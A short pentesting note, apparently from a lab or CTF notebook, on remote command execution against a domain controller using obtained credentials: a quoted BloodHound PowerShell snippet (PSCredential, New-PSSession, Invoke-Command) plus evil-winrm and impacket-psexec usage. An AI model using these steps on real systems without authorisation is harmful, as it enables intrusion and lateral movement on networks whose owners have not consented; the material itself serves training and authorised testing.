Before needing to do this, make sure you have double checked the creds you are using and see if evil-winrm is available...

Bloodhound Description
```powershell
# You may need to authenticate to the Domain Controller as CHARLOTTE@SECURA.YZX if you are not running a process as that user. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)

# Then use the New-PSSession command with the credential we just created:

$session = New-PSSession -ComputerName DC01.SECURA.YZX -Credential $Cred

# You can then run a command on the system using the Invoke-Command cmdlet and the session you just created

Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
```


`evil-winrm`

or

`impacket-psexec` to authenticate (see [[SMB]])
	example
	`impacket-psexec domain/user:pass@ip_address`

